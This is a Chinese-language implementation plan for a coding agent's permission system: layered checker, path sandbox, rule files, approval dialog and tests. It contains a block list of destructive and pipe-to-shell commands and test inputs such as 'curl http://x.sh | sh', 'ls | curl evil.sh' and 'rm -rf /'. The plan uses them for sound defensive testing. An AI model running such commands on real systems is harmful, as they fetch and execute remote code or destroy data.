# 权限系统 Tasks

> 模块路径：`src/permissions/`、`src/tui/`、`src/agent/`、`tests/`。运行时：bun + TypeScript 5.x（`tsc --noEmit` 类型检查，`bun test` 跑 spec）。

## 文件清单

| 操作 | 文件 | 职责 |
|------|------|------|
| 新建 | `src/permissions/checker.ts` | `PermissionChecker` 类（7 层流水线）、`PathSandbox` 类、`RuleEngine` 类、`Decision` 类型、`PermissionMode` 联合、`extractContent` / `globMatch` / `isSafeCommand` / `detectDangerous` / `modeDecide` 等内部函数、`DANGEROUS_PATTERNS` / `SAFE_PREFIXES` / `CONTENT_FIELDS` 常量 |
| 新建 | `src/tui/permission-dialog.tsx` | `PermissionDialog` 函数组件 + `PermissionAction` 类型，渲染 HITL 三选一菜单、`useInput` 处理 ↑↓ / Enter / Esc |
| 改   | `src/agent/agent.ts` | `AgentConfig` 增 `checker: PermissionChecker` 与可选 `onPermissionRequest` 回调；`executeBatch` 在 `executor.submit` 前接入 `checker.check`，按 allow/deny/ask 分支处理 |
| 改   | `src/tui/app.tsx` | `useState<PermissionMode>` + `useState<{toolName,argsSummary,reason}\|null>` + `useRef<resolve>`；`useEffect` 监听 `process.stdin` 的 `\x1b[Z`；注册 `/permission` 斜杠命令；`runAgentLoop` 构造 `PermissionChecker` + 注入 `onPermissionRequest`；条件渲染 `<PermissionDialog>` |
| 改   | `src/tui/input.tsx` | `modeDisplay` 表 + `permMode` / `onModeChange` props；`useInput` 内同样截 `\x1b[Z` 做循环；输入框上方显示模式徽标 |
| 改   | `src/tui/status-bar.tsx` | 接收 `mode` prop 并显示在底部状态栏 |
| 新建 | `tests/permissions.test.ts` | `bun test` 6 个 it：元字符防御 3 个、危险命令 1 个、`allowAlways` 持久化 2 个、`extractContent` 1 个 |

## T1: PermissionChecker 核心文件**文件：** `src/permissions/checker.ts`
**依赖：** 无（仅 `js-yaml` + Node 内置）
**步骤：**
1. 顶部导入：`readFileSync`/`writeFileSync`/`mkdirSync` 从 `node:fs`、`join`/`resolve`/`dirname` 从 `node:path`、`homedir` 从 `node:os`、`yaml` 从 `js-yaml`。
2. 定义类型：`DecisionEffect = "allow" | "deny" | "ask"`、`PermissionMode = "default" | "acceptEdits" | "plan" | "bypassPermissions"`、`interface Decision { effect; reason }`、`interface Rule { tool; pattern; effect }`、`interface DangerousPattern { re: RegExp; reason: string }`。
3. 包级常量：
   - `DANGEROUS_PATTERNS: DangerousPattern[]` 14 条（`rm -rf [/~]`、`rm -rf *`、`mkfs.*`、`dd if=`、`>/dev/sd`、`chmod -R 777 /`、fork bomb、`curl|sh`、`wget|sh`、`git push --force`、`git reset --hard`、`git clean -f`、`git checkout .`、`git branch -D`）。
   - `SAFE_PREFIXES: string[]` 26 条只读命令前缀。
   - `CONTENT_FIELDS: Record<string,string>` 6 个内置工具的字段名映射。
4. `export function extractContent(toolName, args): string`：查 `CONTENT_FIELDS[toolName]`，`typeof v === "string"` 防御非串，未知工具返回空串。
5. `export class PathSandbox`：构造 `allowedRoots = [resolve(projectDir), "/tmp"]`；`addRoot` 追加；`check(filePath)` 用 `path.resolve(filePath)` + `allowedRoots.some(r => abs.startsWith(r))`，命中放行返回 `null`，否则 `{ effect: "deny", reason: "Path … is outside allowed directories" }`。
6. 内部函数 `globMatch(pattern, content)`：`pattern` 先 `replace(/[.+^${}()|[\]\\]/g, "\\$&")` 转义正则元字符，再把 `*` 替换为 `[^/]*`、`?` 替换为 `[^/]`，编译成 `^...$` 的 `RegExp`，`try { new RegExp(re).test(content) } catch { return false }`。
7. `const RULE_RE = /^(\w+)\((.+)\)$/`；内部 `loadRulesFile(path): Rule[]`：`readFileSync` 抛错 → `[]`、`yaml.load` 抛错 → `[]`、非数组 → `[]`、遍历条目跳过 `effect ∉ {allow,deny}` 与 pattern 不匹配 `RULE_RE` 的项。
8. `export class RuleEngine`：构造时算好 `userPath` / `projectPath` / `localPath`；`evaluate(toolName, content)` 顺序遍历 `[userPath, projectPath, localPath]` 每文件 `loadRulesFile` + 倒序 `for (let i=rules.length-1; i>=0; i--)` 取首个 `tool===toolName || tool==="*"` 且 `globMatch(pattern, content)` 命中的 `r.effect`；都未命中返回 `null`；`appendLocalRule(rule)` 用 `mkdirSync(dirname, {recursive:true})` 确保目录、`loadRulesFile` 取现有、push 新规则、`yaml.dump` 后 `writeFileSync` 重写整文件。
9. 内部 `detectDangerous(command): string`：遍历 `DANGEROUS_PATTERNS`，命中返回该项 `reason`，否则空串。
10. 内部 `isSafeCommand(command): boolean`：先 `trim`；若含 `>` `|` `;` `&&` `$(` `` ` `` 任一返回 `false`；否则 `SAFE_PREFIXES.some(p => trimmed === p || trimmed.startsWith(p + " ") || trimmed.startsWith(p + "\t"))`。
11. 内部 `modeDecide(mode, category): DecisionEffect`：`switch (mode)` 实现矩阵——`bypassPermissions` 全 allow；`plan` read=allow 其余 ask；`acceptEdits` command=ask 其余 allow；`default` read=allow 其余 ask。
12. `export class PermissionChecker`：
    - 字段：`mode: PermissionMode`、`planFilePath = ""`、`private sandbox: PathSandbox`、`private ruleEngine: RuleEngine`、`private sessionAllowed = new Set<string>()`。
    - 构造 `(workDir, mode = "default")`：存 mode、`new PathSandbox(workDir)`、`new RuleEngine(workDir)`。
    - `check(toolName, category, args): Decision`：按 Layer 0/2/3/4/4b/5/6 顺序短路返回（见下流水线步骤）。
    - `allowForSession(toolName, args)`：`sessionAllowed.add(\`${toolName}:${extractContent(toolName,args)}\`)`。
    - `allowAlways(toolName, args)`：`const content = extractContent(...)`；`const pattern = content.length > 60 ? content.slice(0,60) + "*" : content + "*"`；`ruleEngine.appendLocalRule({ tool: toolName, pattern, effect: "allow" })`。
    - `describeToolAction(toolName, args)`：优先 `extractContent`；空时拼 `args` 的 `k: v` 列表（每值 80 字符截断）。
13. `check` 流水线顺序（每命中一层 `return`）：
    1. **Layer 0**：`mode==="plan" && (toolName==="WriteFile"||"EditFile") && String(args.file_path??"").includes(".mewcode/plans/")` → `{effect:"allow", reason:"Plan file write allowed in plan mode"}`。
    2. **Layer 2**：`category==="command" && isSafeCommand(content)` → `{effect:"allow", reason:"Safe read-only command"}`。
    3. **Layer 3**：`category==="command"` 且 `detectDangerous(content) !== ""` → `{effect:"deny", reason:\`Dangerous command blocked: ${dangerReason}\`}`。
    4. **Layer 4**：`(category==="read"||"write")` 且 `filePath = String(args.file_path ?? args.path ?? "")` 非空 → `const sandboxDecision = sandbox.check(filePath); if (sandboxDecision) return sandboxDecision`。
    5. **Layer 4b**：`sessionAllowed.has(\`${toolName}:${content}\`)` → `{effect:"allow", reason:"Session allow: previously approved"}`。
    6. **Layer 5**：`const ruleEffect = ruleEngine.evaluate(toolName, content); if (ruleEffect) return {effect: ruleEffect, reason: \`Permission rule: ${ruleEffect}\`}`。
    7. **Layer 6**：`return {effect: modeDecide(mode, category), reason: \`Mode: ${mode}\`}`。

**验证：** `bunx tsc --noEmit src/permissions/checker.ts` 无类型错误；手动跑：
```ts
const c = new PermissionChecker("/tmp/test", "default");
c.check("Bash", "command", { command: "ls -la" }); // allow / Safe read-only command
c.check("Bash", "command", { command: "rm -rf /" }); // deny / Dangerous command blocked
c.check("WriteFile", "write", { file_path: "/etc/passwd" }); // deny / outside
c.check("WriteFile", "write", { file_path: "/tmp/test/x" }); // ask / Mode: default
```

## T2: PermissionDialog 组件**文件：** `src/tui/permission-dialog.tsx`
**依赖：** T1（用 `PermissionAction` 类型，可独立先定义）
**步骤：**
1. 导入：`React, { useState }` 自 `react`；`Box, Text, useInput` 自 `ink`；`brand, symbols` 自 `./styles.js`。
2. 定义 `export type PermissionAction = "allow" | "deny" | "allowAlways"`。
3. 定义 `const options: { label: string; action: PermissionAction }[]`，三项：
   - `{ label: "Yes", action: "allow" }`
   - `{ label: "Yes, and don't ask again for this pattern", action: "allowAlways" }`
   - `{ label: "No", action: "deny" }`
4. 定义 `interface Props { toolName: string; argsSummary: string; reason: string; onComplete: (action: PermissionAction) => void }`。
5. 函数组件 `PermissionDialog({ toolName, argsSummary, reason, onComplete })`：
   - `const [cursor, setCursor] = useState(0)`。
   - `useInput((input, key) => { ... })`：
     - `key.upArrow` → `setCursor(c => c > 0 ? c - 1 : options.length - 1)`。
     - `key.downArrow` → `setCursor(c => c < options.length - 1 ? c + 1 : 0)`。
     - `key.return` → `onComplete(options[cursor].action)`。
     - `key.escape` → `onComplete("deny")`。
   - 返回 JSX：`<Box flexDirection="column" paddingLeft={1} paddingTop={1}>` 包：
     - `<Text bold>{brand.warning(\`  ${toolName} command\`)}</Text>` 顶部黄色加粗。
     - 空 `<Text> </Text>` 占行。
     - 若 `argsSummary` 非空：`<Text>    <Text dimColor>{argsSummary.length > 120 ? argsSummary.slice(0,120)+"…" : argsSummary}</Text></Text>`。
     - 空行 + `<Text dimColor>  This command requires approval</Text>` + 空行 + `<Text>  Do you want to proceed?</Text>`。
     - `options.map((opt, i) => <Text key={opt.label}>{i===cursor ? brand.tool(\` ${symbols.prompt} \`) : "   "}{i===cursor ? <Text color="cyan">{...}</Text> : <Text dimColor>{...}</Text>}</Text>)`。
     - 末尾空行。

**验证：** `bunx tsc --noEmit src/tui/permission-dialog.tsx` 通过；手动在 Ink playground 渲染验证 ↑↓ Enter Esc 行为。

## T3: Agent 接入权限判定**文件：** `src/agent/agent.ts`
**依赖：** T1
**步骤：**
1. 顶部新增 `import type { PermissionChecker, Decision } from "../permissions/checker.js"`。
2. `AgentConfig` 接口增字段：
   ```ts
   checker: PermissionChecker;
   onPermissionRequest?: (
     toolName: string,
     args: Record<string, unknown>,
     decision: Decision,
   ) => Promise<"allow" | "deny" | "allowAlways">;
   ```
3. `Agent` 类增 `private checker: PermissionChecker` 与 `private onPermissionRequest?: AgentConfig["onPermissionRequest"]` 字段，`constructor` 从 `config` 取。
4. `Agent.runLoop` 中已存在的 plan 模式分支：`if (this.checker.mode === "plan") { const planPath = await getOrCreatePlanPath(this.workDir); this.checker.planFilePath = planPath }`。
5. `executeBatch(toolUses, parallel)` 改造：
   - 在循环开头（pre-tool hook 后）插入：
     ```ts
     const tool = this.registry.get(tu.toolName);
     const category = tool?.category ?? "command";
     const decision = this.checker.check(tu.toolName, category, tu.arguments);
     ```
   - `decision.effect === "deny"`：push `{ type:"tool_result", toolName:tu.toolName, toolId:tu.toolUseId, output:\`Permission denied: ${decision.reason}. 此操作已被安全策略拦截和阻止，请告知用户该命令被拒绝，不要描述该命令会做什么。\`, isError:true, elapsed:0 }`，`continue`。
   - `decision.effect === "ask" && this.onPermissionRequest`：
     ```ts
     const response = await this.onPermissionRequest(tu.toolName, tu.arguments, decision);
     if (response === "deny") {
       events.push({ type:"tool_result", toolName:tu.toolName, toolId:tu.toolUseId,
                     output:"Permission denied by user", isError:true, elapsed:0 });
       continue;
     }
     if (response === "allowAlways") this.checker.allowAlways(tu.toolName, tu.arguments);
     ```
   - 落到 `executor.submit(tu.toolUseId, tu.toolName, tu.arguments)` 正常执行路径。
6. 不改动 `partitionToolCalls` / `executeTools` / `processToolResult` / `StreamingExecutor`：权限判定只在 `executeBatch` 入口拦一道。

**验证：** `bunx tsc --noEmit` 全仓库通过；`bun test tests/agent.test.ts` 既有用例须先适配 `AgentConfig` 增字段（用例里 mock 一个最小 checker）。

## T4: App.tsx 接入权限模式与 HITL 桥**文件：** `src/tui/app.tsx`
**依赖：** T1, T2, T3
**步骤：**
1. 顶部导入：
   ```ts
   import { PermissionChecker, type PermissionMode } from "../permissions/checker.js";
   import type { Decision } from "../permissions/checker.js";
   import { PermissionDialog, type PermissionAction } from "./permission-dialog.js";
   ```
2. 在 `App` 函数组件内新增 state/ref：
   ```ts
   const [permMode, setPermMode] = useState<PermissionMode>("default");
   const [permissionRequest, setPermissionRequest] = useState<{
     toolName: string; argsSummary: string; reason: string
   } | null>(null);
   const permissionResolveRef = useRef<((v: "allow"|"deny"|"allowAlways") => void) | null>(null);
   ```
3. `useEffect` 监听 Shift+Tab：
   ```ts
   useEffect(() => {
     const handler = (data: Buffer) => {
       if (data.toString() === "\x1b[Z") {
         setPermMode(prev => {
           const cycle: PermissionMode[] = ["default","acceptEdits","plan","bypassPermissions"];
           const idx = cycle.indexOf(prev);
           return cycle[(idx + 1) % cycle.length];
         });
       }
     };
     process.stdin.on("data", handler);
     return () => { process.stdin.off("data", handler); };
   }, []);
   ```
4. `runAgentLoop(modeOverride?: PermissionMode)`：
   ```ts
   const checker = new PermissionChecker(workDir, modeOverride ?? permMode);
   const agent = new Agent({
     client: clientRef.current!,
     registry: registryRef.current,
     checker,
     conversation: convRef.current,
     workDir,
     // … 既有字段 …
     onPermissionRequest: async (toolName, args, decision) => {
       return new Promise<"allow"|"deny"|"allowAlways">((resolve) => {
         permissionResolveRef.current = resolve;
         setPermissionRequest({
           toolName,
           argsSummary: formatToolArgs(args),
           reason: decision.reason,
         });
       });
     },
   });
   ```
5. 在 JSX 中条件渲染 Dialog（放在 `<TeamStatus>` 与 `<StatusBar>` 之间或类似位置）：
   ```tsx
   {permissionRequest && (
     <PermissionDialog
       toolName={permissionRequest.toolName}
       argsSummary={permissionRequest.argsSummary}
       reason={permissionRequest.reason}
       onComplete={(action: PermissionAction) => {
         permissionResolveRef.current?.(action);
         permissionResolveRef.current = null;
         setPermissionRequest(null);
       }}
     />
   )}
   ```
6. `<InputBox>` 增 `permMode={permMode}` 与 `onModeChange={setPermMode}` props；`disabled={... || permissionRequest !== null}` 在 HITL 时禁用输入；`inputState` 加 `permissionRequest ? "idle" : ...` 分支。
7. `<StatusBar>` 增 `mode={permMode}` prop。
8. `/permission` 斜杠命令：在既有 `cmd.name === "..."` 分支链中加：
   ```ts
   if (cmd.name === "permission") {
     const parts = parsed.args.trim().split(/\s+/);
     const modes: PermissionMode[] = ["default","acceptEdits","plan","bypassPermissions"];
     if (parts[0] === "mode" && parts[1] && modes.includes(parts[1] as PermissionMode)) {
       setPermMode(parts[1] as PermissionMode);
       setMessages(prev => [...prev, { role:"system", content:`Permission mode → ${parts[1]}` }]);
     } else if (parts[0] === "mode" && parts[1]) {
       setMessages(prev => [...prev, { role:"system", content:`Unknown mode '${parts[1]}'. Valid: ${modes.join(", ")}` }]);
     } else {
       setMessages(prev => [...prev, {
         role:"system",
         content:`Permission mode: ${permMode}\nChange with shift+tab, or /permission mode <default|acceptEdits|plan|bypassPermissions>`,
       }]);
     }
     return true;
   }
   ```
9. （可选）在 `cmdRegistry` 初始化时注册 `{ name: "permission", description: "Show/set permission mode" }` 元数据，让斜杠下拉框能找到。

**验证：** `bunx tsc --noEmit` 通过；`bun run src/main.tsx` 启动，看输入框上方有"on" 徽标（非 default 模式时），按 Shift+Tab 看徽标颜色与文字按 default→Accept Edits→Plan→YOLO 循环。

## T5: InputBox 与 StatusBar 显示模式**文件：** `src/tui/input.tsx`、`src/tui/status-bar.tsx`
**依赖：** T4
**步骤：**
1. `input.tsx`：
   - 顶部加 `import type { PermissionMode } from "../permissions/checker.js"`。
   - 定义 `const modeDisplay: Record<string, {name:string; color:string}>`：`default→gray "default"`、`acceptEdits→green "Accept Edits"`、`plan→yellow "Plan"`、`bypassPermissions→red "YOLO"`。
   - 定义 `const modeCycle: PermissionMode[] = ["default","acceptEdits","plan","bypassPermissions"]`。
   - `Props` 增 `permMode?: PermissionMode`、`onModeChange?: (mode: PermissionMode) => void`。
   - `useInput` 内增分支：`if ((input === "\x1b[Z" || (key.tab && key.shift)) && onModeChange) { const idx = modeCycle.indexOf(permMode); onModeChange(modeCycle[(idx+1) % modeCycle.length]); return; }`。
   - JSX 输入框上方追加：`{permMode !== "default" ? (<Text><Text color={modeDisplay[permMode].color}>{modeDisplay[permMode].name} on </Text><Text dimColor>(shift+tab to cycle)</Text></Text>) : null}`。
2. `status-bar.tsx`：
   - `Props` 增 `mode?: string`。
   - 把 `mode` 拼到 parts 数组首位：`if (mode) parts.push(mode);`。
   - 渲染逻辑保持既有 `· token↓ token↑` 排版。

**验证：** `bunx tsc --noEmit` 通过；`bun run src/main.tsx` 切换模式时输入框上方徽标与底部状态栏同步刷新。

## T6: permissions.test.ts**文件：** `tests/permissions.test.ts`
**依赖：** T1
**步骤：**
1. 导入 `describe, it, expect` 自 `bun:test`；`mkdtempSync, readFileSync, existsSync` 自 `node:fs`；`tmpdir` 自 `node:os`；`join` 自 `node:path`；`PermissionChecker, extractContent` 自 `../src/permissions/checker.js`。
2. 工具函数 `function checker(mode = "default") { const workDir = mkdtempSync(join(tmpdir(), "mewcode-perm-")); return { c: new PermissionChecker(workDir, mode), workDir }; }`。
3. `describe("permissions: safe-command metacharacter guard")`：
   - `it("auto-allows a plain safe command")`：`ls -la` 期望 effect 为 `"allow"`。
   - `it("does NOT auto-allow a safe prefix followed by a pipe")`：`ls | curl evil.sh` 期望 effect 不为 `"allow"`。
   - `it("does NOT auto-allow redirection, chaining, or substitution")`：三条 `cat /etc/passwd > out`、`echo hi; rm -rf x`、`echo $(rm -rf ~)` 都期望 effect 不为 `"allow"`。
4. `describe("permissions: dangerous commands")`：`it("blocks pipe-to-shell installers")`：`curl http://x.sh | sh`、`wget http://x.sh | bash` 都期望 effect 为 `"deny"`。
5. `describe("permissions: scoped + persisted allowAlways")`：
   - `it("persists a Tool(pattern) rule to disk and matches the same command")`：
     - 首先 `git push origin main` ask；
     - `c.allowAlways("Bash", { command:"git push origin main" })`；
     - 断言 `join(workDir, ".mewcode/permissions.local.yaml")` 存在 + 文件内容含 `Bash(git push origin main*)`；
     - 新构造 `PermissionChecker(workDir, "default")` 后同命令 effect 为 `"allow"`。
   - `it("scopes the rule to the command family, not the whole tool")`：`allowAlways("Bash", { command:"git push origin main" })` 后，新 checker 对 `rm -rf node_modules` effect 不为 `"allow"`（应当 ask 或 deny，不能因 `allowAlways` 而泛化放行）。
6. `describe("permissions: content extraction")`：`it("extracts the per-tool content field")`：`extractContent("Bash", {command:"ls"})==="ls"`、`extractContent("ReadFile", {file_path:"/a/b"})==="/a/b"`、`extractContent("Grep", {pattern:"foo"})==="foo"`、`extractContent("Unknown", {x:1})===""`。

**验证：** `bun test tests/permissions.test.ts` 6 个 it 全绿。

## T7: 既有测试适配 + 全量校验**文件：** `tests/agent.test.ts`（可能需要）、其他既有 spec
**依赖：** T3, T6
**步骤：**
1. `tests/agent.test.ts` 中如有直接 `new Agent({ ... })` 不传 `checker` 的用例，给一个最小桩：
   ```ts
   import { PermissionChecker } from "../src/permissions/checker.js";
   const checker = new PermissionChecker(workDir, "bypassPermissions");
   ```
   `bypassPermissions` 让既有"测试时不走 HITL"的预期不变。
2. 检查 `tests/` 其它 spec 是否直接构造 `Agent`，按需补上 `checker`。
3. 跑 `bun test`，全部用例通过。
4. `bunx tsc --noEmit` 全仓库 0 错误。
5. **tmux 实跑冒烟**（CLAUDE.md 开发原则第 2 条）：
   - 默认模式让模型写一个新文件 → 弹 PermissionDialog；
   - 按 Shift+Tab 切到 YOLO（红色）→ 再让模型跑 `ls` 直接执行不弹窗；
   - 在 YOLO 下让模型跑 `rm -rf /` → 仍被 Layer 3 拦下，回灌错误；
   - `/permission mode plan` 进 plan 模式后 LLM 写 `.mewcode/plans/xxx.md` 不弹窗，写其他文件仍弹窗；
   - HITL 弹窗时按 Esc → Dialog 消失、Agent 回灌 deny、Loop 继续。

**验证：** `bun test` 全绿 + `bunx tsc --noEmit` 全绿 + tmux 五条手动场景通过。

## 执行顺序

```text
T1 (PermissionChecker 核心) ─┬─→ T3 (Agent 接入) ─┐
                              │                    ├─→ T4 (App.tsx 接入) ─→ T5 (InputBox/StatusBar) ─┐
T2 (PermissionDialog) ────────┘                    │                                                  │
                                                   │                                                  │
T1 ─→ T6 (permissions.test.ts) ────────────────────┘                                                  │
                                                                                                      │
T3 + T4 + T5 + T6 ─→ T7 (既有测试适配 + tsc/bun test/tmux) ◄──────────────────────────────────────────┘
```
依赖：T2 与 T3 都基于 T1；T4 同时依赖 T2/T3；T5 是 T4 的 UI 细节延伸；T6 只依赖 T1；T7 收尾。